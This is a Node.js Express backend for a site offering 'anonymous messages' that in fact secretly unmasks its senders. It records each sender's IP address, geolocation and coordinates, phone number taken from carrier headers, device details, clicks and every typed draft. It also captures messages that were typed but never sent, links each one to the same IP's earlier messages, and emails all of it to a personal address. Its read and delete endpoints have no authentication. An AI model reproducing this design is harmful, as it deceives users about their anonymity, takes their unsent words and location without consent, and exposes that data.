const express = require('express');
const cors = require('cors');
const path = require('path');
// Load environment variables from .env files (project root or backend folder)
try {
  require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
  require('dotenv').config({ path: path.join(__dirname, '.env') });
} catch (_) {}
const axios = require('axios');
const UAParser = require('ua-parser-js');
const { Resend } = require('resend');
const mongoose = require('mongoose');

// Detect source app from referrer/user-agent
function detectSource(referrer = '', uaRaw = '') {
  const ref = referrer.toLowerCase();
  const ua = uaRaw.toLowerCase();

  const checks = [
    { key: 'instagram', value: 'Instagram' },
    { key: 'whatsapp', value: 'WhatsApp' },
    { key: 'wa.me', value: 'WhatsApp' },
    { key: 'facebook', value: 'Facebook' },
    { key: 'fb', value: 'Facebook' },
    { key: 'messenger', value: 'Messenger' },
    { key: 't.me', value: 'Telegram' },
    { key: 'telegram', value: 'Telegram' },
    { key: 'snapchat', value: 'Snapchat' },
    { key: 'twitter', value: 'Twitter/X' },
    { key: 'x.com', value: 'Twitter/X' },
    { key: 'tiktok', value: 'TikTok' }
  ];

  for (const { key, value } of checks) {
    if (ref.includes(key) || ua.includes(key)) return value;
  }
  if (ref && ref !== 'direct') return 'Other Referrer';
  return 'Direct/Unknown';
}

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB Connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/anonymous-messages';
mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ MongoDB connected'))
  .catch(err => console.error('❌ MongoDB connection failed:', err.message));

// MongoDB Schema
const messageSchema = new mongoose.Schema({
  id: { type: Number, required: true },
  message: { type: String, required: true },
  timestamp: { type: String, required: true },
  timeOnPage: Number,
  clickPatterns: [{ element: String, timestamp: Number }],
  textHistory: [{ text: String, timestamp: Number }],
  ip: String,
  location: String,
  coordinates: {
    latitude: Number,
    longitude: Number,
    accuracy: Number
  },
  userAgent: {
    browser: String,
    browserVersion: String,
    os: String,
    osVersion: String,
    deviceType: String
  },
  referrer: String,
  source: String,
  language: String,
  shareTag: String,
  phone: String
}, { timestamps: true });

const Message = mongoose.model('Message', messageSchema);

// Schema for abandoned messages (typed but not sent)
const abandonedMessageSchema = new mongoose.Schema({
  id: { type: Number, required: true },
  partialMessage: { type: String, required: true },
  timestamp: { type: String, required: true },
  timeOnPage: Number,
  clickPatterns: [{ element: String, timestamp: Number }],
  textHistory: [{ text: String, timestamp: Number }],
  ip: String,
  location: String,
  coordinates: {
    latitude: Number,
    longitude: Number,
    accuracy: Number
  },
  userAgent: {
    browser: String,
    browserVersion: String,
    os: String,
    osVersion: String,
    deviceType: String
  },
  referrer: String,
  source: String,
  language: String,
  shareTag: String,
  phone: String,
  reason: { type: String, default: 'page_exit' } // page_exit, tab_close, etc.
}, { timestamps: true });

const AbandonedMessage = mongoose.model('AbandonedMessage', abandonedMessageSchema);

app.set('trust proxy', true);
app.use(cors());
app.use(express.json());

// Serve static files from frontend folder
app.use(express.static(path.join(__dirname, '../frontend')));

const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : null;

// Log email configuration status
if (resend) {
  console.log('📧 Resend email enabled');
  console.log('   From:', process.env.FROM_EMAIL || 'onboarding@resend.dev');
  console.log('   To  :', process.env.TO_EMAIL || 'isumuthsara2003@gmail.com');
} else {
  console.log('⚠️ Resend email disabled (RESEND_API_KEY not set)');
}

async function sendEmail(subject, text, html) {
  if (!resend) {
    console.log('❌ Email disabled: RESEND_API_KEY not set');
    console.log('Set RESEND_API_KEY environment variable to enable emails');
    return;
  }

  try {
    const fromEmail = process.env.FROM_EMAIL || 'onboarding@resend.dev';
    const toEmail = process.env.TO_EMAIL || 'isumuthsara2003@gmail.com';
    
    console.log(`📧 Sending email - From: ${fromEmail}, To: ${toEmail}`);
    
    await resend.emails.send({
      from: fromEmail,
      to: toEmail,
      subject: subject,
      text,
      html
    });
    console.log(`✅ Email notification sent`);
  } catch (err) {
    console.error('❌ Email send failed:', err.message);
  }
}

// Get all messages
app.get('/messages', async (req, res) => {
  try {
    const messages = await Message.find().sort({ id: -1 }).lean();
    res.json(messages);
  } catch (err) {
    console.error('Error fetching messages:', err);
    res.json([]);
  }
});

// Get all abandoned messages
app.get('/abandoned-messages', async (req, res) => {
  try {
    const abandoned = await AbandonedMessage.find().sort({ id: -1 }).lean();
    res.json(abandoned);
  } catch (err) {
    console.error('Error fetching abandoned messages:', err);
    res.json([]);
  }
});

// Post abandoned message (when user leaves without sending)
app.post('/abandoned-message', async (req, res) => {
  try {
    const { partialMessage, reason } = req.body;
    console.log('📨 Abandoned message received:', { partialMessage, reason });
    
    // Only track if there's actual content
    if (!partialMessage?.trim() || partialMessage.trim().length < 3) {
      console.log('⏭️ Skipped - message too short:', partialMessage?.length);
      return res.status(200).json({ message: 'Too short, not tracked' });
    }
    
    console.log('✅ Processing abandoned message...');

    const ip = getClientIP(req);
    const { location, coordinates } = await getGeolocation(ip);
    const phoneAuto = extractPhone(req);
    const userAgent = parseUserAgent(req);
    const referrer = req.headers['referer'] || 'Direct';
    const language = (req.headers['accept-language'] || 'Unknown').split(',')[0].trim();
    const source = detectSource(referrer, req.headers['user-agent']);

    const abandonedData = {
      id: Date.now(),
      partialMessage: partialMessage.trim(),
      timestamp: new Date().toISOString(),
      ip,
      location,
      coordinates: req.body.coordinates || coordinates,
      timeOnPage: req.body.timeOnPage || null,
      clickPatterns: req.body.clickPatterns || [],
      textHistory: req.body.textHistory || [],
      userAgent,
      referrer,
      source,
      language,
      shareTag: req.body.shareTag || null,
      reason: reason || 'page_exit'
    };
    if (phoneAuto) abandonedData.phone = phoneAuto;

    // Save to MongoDB
    const saved = await AbandonedMessage.create(abandonedData);

    // Find all previous messages from this IP (both sent and abandoned)
    const previousSent = await Message.find({ ip }).sort({ id: -1 }).limit(5).lean();
    const previousAbandoned = await AbandonedMessage.find({ 
      ip, 
      id: { $ne: saved.id } 
    }).sort({ id: -1 }).limit(5).lean();

    // EMAIL notification
    const coord = saved.coordinates || {};
    const uaInfo = saved.userAgent || {};
    const mapsLink = (coord.latitude && coord.longitude)
      ? `https://www.google.com/maps?q=${coord.latitude},${coord.longitude}`
      : null;
    const osmLink = (coord.latitude && coord.longitude)
      ? `https://www.openstreetmap.org/?mlat=${coord.latitude}&mlon=${coord.longitude}#map=16/${coord.latitude}/${coord.longitude}`
      : null;

    const textBody = `
🚨 ABANDONED MESSAGE (User left without sending)

Partial Message: ${saved.partialMessage}
Reason: ${saved.reason}
Time (Sri Lanka - UTC +5:30): ${new Date(new Date(saved.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}
Time on Page: ${saved.timeOnPage ?? 'N/A'} seconds
Click Patterns: ${saved.clickPatterns.length > 0 ? saved.clickPatterns.map(c => `${c.element} at ${c.timestamp}ms`).join(', ') : 'None'}
Text History: ${saved.textHistory.length > 0 ? saved.textHistory.map(h => `"${h.text}" at ${h.timestamp}ms`).join(' → ') : 'None'}
IP: ${saved.ip}
Location: ${saved.location}
Coordinates: ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)
Browser: ${uaInfo.browser} ${uaInfo.browserVersion}
OS: ${uaInfo.os} ${uaInfo.osVersion}
Device: ${uaInfo.deviceType}
Referrer: ${saved.referrer}
Source: ${saved.source}
Share Tag: ${saved.shareTag ?? 'N/A'}
Language: ${saved.language}${phoneAuto ? `\nPhone: ${phoneAuto}` : ''}
${mapsLink ? `\nMap (Google): ${mapsLink}` : ''}
${osmLink ? `\nMap (OpenStreetMap): ${osmLink}` : ''}

User's Previous Sent Messages: ${previousSent.length > 0 ? previousSent.map(m => `"${m.message}" (${new Date(m.timestamp).toISOString().slice(0, 19).replace('T', ' ')})`).join(' | ') : 'None'}
User's Previous Abandoned Messages: ${previousAbandoned.length > 0 ? previousAbandoned.map(m => `"${m.partialMessage}" (${new Date(m.timestamp).toISOString().slice(0, 19).replace('T', ' ')})`).join(' | ') : 'None'}
    `.trim();

    const htmlBody = `
      <div style="font-family: Arial, sans-serif; line-height: 1.5; background-color: #fff3cd; padding: 15px; border-left: 5px solid #ffc107;">
        <h2 style="color: #856404;">🚨 ABANDONED MESSAGE (User left without sending)</h2>
        <p><strong>Partial Message:</strong> ${saved.partialMessage}</p>
        <p><strong>Reason:</strong> ${saved.reason}</p>
        <p><strong>Time (Sri Lanka - UTC +5:30):</strong> ${new Date(new Date(saved.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}</p>
        <p><strong>Time on Page:</strong> ${saved.timeOnPage ?? 'N/A'} seconds</p>
        <p><strong>Click Patterns:</strong> ${saved.clickPatterns.length > 0 ? saved.clickPatterns.map(c => `${c.element} at ${c.timestamp}ms`).join(', ') : 'None'}</p>
        <p><strong>Text History (All Drafts):</strong><br/>
        ${saved.textHistory.length > 0 ? saved.textHistory.map((h, i) => `${i + 1}. "${h.text}" (at ${h.timestamp}ms)`).join('<br/>') : 'None'}</p>
        <p><strong>IP:</strong> ${saved.ip}</p>
        <p><strong>Location:</strong> ${saved.location}</p>
        <p><strong>Coordinates:</strong> ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)</p>
        <p><strong>Browser:</strong> ${uaInfo.browser} ${uaInfo.browserVersion}</p>
        <p><strong>OS:</strong> ${uaInfo.os} ${uaInfo.osVersion}</p>
        <p><strong>Device:</strong> ${uaInfo.deviceType}</p>
        <p><strong>Referrer:</strong> ${saved.referrer}</p>
        <p><strong>Source:</strong> ${saved.source}</p>
        <p><strong>Share Tag:</strong> ${saved.shareTag ?? 'N/A'}</p>
        <p><strong>Language:</strong> ${saved.language}</p>
        ${phoneAuto ? `<p><strong>Phone:</strong> ${phoneAuto}</p>` : ''}
        ${mapsLink ? `<p><a href="${mapsLink}" target="_blank">View on Google Maps</a></p>` : ''}
        ${osmLink ? `<p><a href="${osmLink}" target="_blank">View on OpenStreetMap</a></p>` : ''}
        <p><strong>User's Previous Sent Messages:</strong> ${previousSent.length > 0 ? previousSent.map((m, i) => `<br/>${i + 1}. "${m.message}" (${new Date(m.timestamp).toISOString().slice(0, 19).replace('T', ' ')})`).join('') : 'None'}</p>
        <p><strong>User's Previous Abandoned Messages:</strong> ${previousAbandoned.length > 0 ? previousAbandoned.map((m, i) => `<br/>${i + 1}. "${m.partialMessage}" (${new Date(m.timestamp).toISOString().slice(0, 19).replace('T', ' ')})`).join('') : 'None'}</p>
      </div>
    `;

    sendEmail('⚠️ Abandoned Message Alert', textBody, htmlBody);

    res.status(201).json({
      message: 'Abandoned message tracked',
      data: saved
    });
  } catch (err) {
    console.error('❌ Error saving abandoned message:', err);
    res.status(500).json({ error: err.message || 'Failed to save' });
  }
});

// Helper: Extract and validate IP
function getClientIP(req) {
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (typeof ip === 'string' && ip.includes(',')) {
    ip = ip.split(',')[0].trim();
  }
  if (ip === '::1') ip = '127.0.0.1';
  return ip;
}

// Helper: Get geolocation from IP
async function getGeolocation(ip) {
  let location = 'Unknown';
  let coordinates = null;
  try {
    if (ip && ip !== '127.0.0.1' && ip !== '::1') {
      const r = await axios.get(`http://ip-api.com/json/${ip}`);
      if (r.data?.status === 'success') {
        location = `${r.data.city}, ${r.data.country}`;
        if (r.data.lat && r.data.lon) {
          coordinates = { latitude: r.data.lat, longitude: r.data.lon, accuracy: 5000 };
        }
      }
    } else {
      location = 'Local/Localhost';
    }
  } catch (error) {
    console.error('Geolocation error:', error.message);
  }
  return { location, coordinates };
}

// Helper: Extract phone from carrier headers
function extractPhone(req) {
  const candidates = ['x-msisdn', 'x-up-calling-line-id', 'x-wap-msisdn', 'x-hutch-msisdn', 'x-source-msisdn', 'x-network-info'];
  for (const key of candidates) {
    const raw = req.headers[key];
    if (typeof raw === 'string' && raw.trim()) {
      const sanitized = raw.replace(/[^\d+]/g, '');
      if (sanitized.replace(/\D/g, '').length >= 7) return sanitized;
    }
  }
  return null;
}

// Helper: Parse user agent
function parseUserAgent(req) {
  const uaRaw = req.headers['user-agent'] || '';
  const ua = new UAParser(uaRaw).getResult();
  return {
    browser: ua.browser.name || 'Unknown',
    browserVersion: ua.browser.version || 'Unknown',
    os: ua.os.name || 'Unknown',
    osVersion: ua.os.version || 'Unknown',
    deviceType: ua.device.type || 'Desktop'
  };
}

// Post message
app.post('/message', async (req, res) => {
  try {
    const { message } = req.body;
    if (!message?.trim()) {
      return res.status(400).json({ error: 'Message required' });
    }

    const ip = getClientIP(req);
    const { location, coordinates } = await getGeolocation(ip);
    const clientCoordinates = req.body.coordinates || null;
    const phoneAuto = extractPhone(req);
    const userAgent = parseUserAgent(req);
    const referrer = req.headers['referer'] || 'Direct';
    const language = (req.headers['accept-language'] || 'Unknown').split(',')[0].trim();
    const source = detectSource(referrer, req.headers['user-agent']);

    const newMessageData = {
      id: Date.now(),
      message: message.trim(),
      timestamp: new Date().toISOString(),
      ip,
      location,
      coordinates: clientCoordinates || coordinates,
      timeOnPage: req.body.timeOnPage || null,
      clickPatterns: req.body.clickPatterns || [],
      textHistory: req.body.textHistory || [],
      userAgent,
      referrer,
      source,
      language,
      shareTag: req.body.shareTag || null
    };
    if (phoneAuto) newMessageData.phone = phoneAuto;

    // Save to MongoDB
    const newMessage = await Message.create(newMessageData);

    // Find all previous messages from this IP
    const previousMessages = await Message.find({ 
      ip, 
      id: { $ne: newMessage.id } 
    }).sort({ id: -1 }).lean();

    // EMAIL (async, safe)
    const coord = newMessage.coordinates || {};
    const uaInfo = newMessage.userAgent || {};
    const mapsLink = (coord.latitude && coord.longitude)
      ? `https://www.google.com/maps?q=${coord.latitude},${coord.longitude}`
      : null;
    const osmLink = (coord.latitude && coord.longitude)
      ? `https://www.openstreetmap.org/?mlat=${coord.latitude}&mlon=${coord.longitude}#map=16/${coord.latitude}/${coord.longitude}`
      : null;

    const textBody = `
Message: ${newMessage.message}
Time (Sri Lanka - UTC +5:30): ${new Date(new Date(newMessage.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}
Time on Page: ${newMessage.timeOnPage ?? 'N/A'} seconds
Click Patterns: ${newMessage.clickPatterns.length > 0 ? newMessage.clickPatterns.map(c => `${c.element} at ${c.timestamp}ms`).join(', ') : 'None'}
Text History: ${newMessage.textHistory.length > 0 ? newMessage.textHistory.map(h => `"${h.text}" at ${h.timestamp}ms`).join(' → ') : 'None'}
IP: ${newMessage.ip}
Location: ${newMessage.location}
Coordinates: ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)
Browser: ${uaInfo.browser} ${uaInfo.browserVersion}
OS: ${uaInfo.os} ${uaInfo.osVersion}
Device: ${uaInfo.deviceType}
Referrer: ${newMessage.referrer}
Source: ${newMessage.source}
Share Tag: ${newMessage.shareTag ?? 'N/A'}
Language: ${newMessage.language}${phoneAuto ? `\nPhone: ${phoneAuto}` : ''}
${mapsLink ? `\nMap (Google): ${mapsLink}` : ''}
${osmLink ? `\nMap (OpenStreetMap): ${osmLink}` : ''}

User Previous Messages: ${previousMessages.length > 0 ? previousMessages.map(m => `"${m.message}" (${new Date(m.timestamp).toISOString().slice(0, 19).replace('T', ' ')})`).join(' | ') : 'Nothing'}
    `.trim();
    const htmlBody = `
      <div style="font-family: Arial, sans-serif; line-height: 1.5;">
        <p><strong>Message:</strong> ${newMessage.message}</p>
        <p><strong>Time (Sri Lanka - UTC +5:30):</strong> ${new Date(new Date(newMessage.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}</p>
        <p><strong>Time on Page:</strong> ${newMessage.timeOnPage ?? 'N/A'} seconds</p>
        <p><strong>Click Patterns:</strong> ${newMessage.clickPatterns.length > 0 ? newMessage.clickPatterns.map(c => `${c.element} at ${c.timestamp}ms`).join(', ') : 'None'}</p>
        <p><strong>Text History (All Drafts):</strong><br/>
        ${newMessage.textHistory.length > 0 ? newMessage.textHistory.map((h, i) => `${i + 1}. "${h.text}" (at ${h.timestamp}ms)`).join('<br/>') : 'None'}</p>
        <p><strong>IP:</strong> ${newMessage.ip}</p>
        <p><strong>Location:</strong> ${newMessage.location}</p>
        <p><strong>Coordinates:</strong> ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)</p>
        <p><strong>Browser:</strong> ${uaInfo.browser} ${uaInfo.browserVersion}</p>
        <p><strong>OS:</strong> ${uaInfo.os} ${uaInfo.osVersion}</p>
        <p><strong>Device:</strong> ${uaInfo.deviceType}</p>
        <p><strong>Referrer:</strong> ${newMessage.referrer}</p>
        <p><strong>Source:</strong> ${newMessage.source}</p>
        <p><strong>Share Tag:</strong> ${newMessage.shareTag ?? 'N/A'}</p>
        <p><strong>Language:</strong> ${newMessage.language}</p>
        ${phoneAuto ? `<p><strong>Phone:</strong> ${phoneAuto}</p>` : ''}
        ${mapsLink ? `<p><a href="${mapsLink}" target="_blank">View on Google Maps</a></p>` : ''}
        ${osmLink ? `<p><a href="${osmLink}" target="_blank">View on OpenStreetMap</a></p>` : ''}
        <p><strong>User Previous Messages:</strong> ${previousMessages.length > 0 ? previousMessages.map((m, i) => `<br/>${i + 1}. "${m.message}" (${new Date(m.timestamp).toISOString().slice(0, 19).replace('T', ' ')})`).join('') : 'Nothing'}</p>
      </div>
    `;

    sendEmail('📩 New Anonymous Message', textBody, htmlBody);

    res.status(201).json({
      message: newMessage,
      previousMessages: previousMessages.map(m => ({
        id: m.id,
        message: m.message,
        timestamp: m.timestamp,
        location: m.location
      })),
      totalCount: previousMessages.length + 1
    });
  } catch (err) {
    console.error('❌ Error saving message:', err);
    res.status(500).json({ error: err.message || 'Failed to save message' });
  }
});

// Delete message
app.delete('/message/:id', async (req, res) => {
  try {
    const id = Number(req.params.id);
    await Message.deleteOne({ id });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Failed to delete message' });
  }
});

app.listen(PORT, () => {
  console.log('Server running on port', PORT);
});
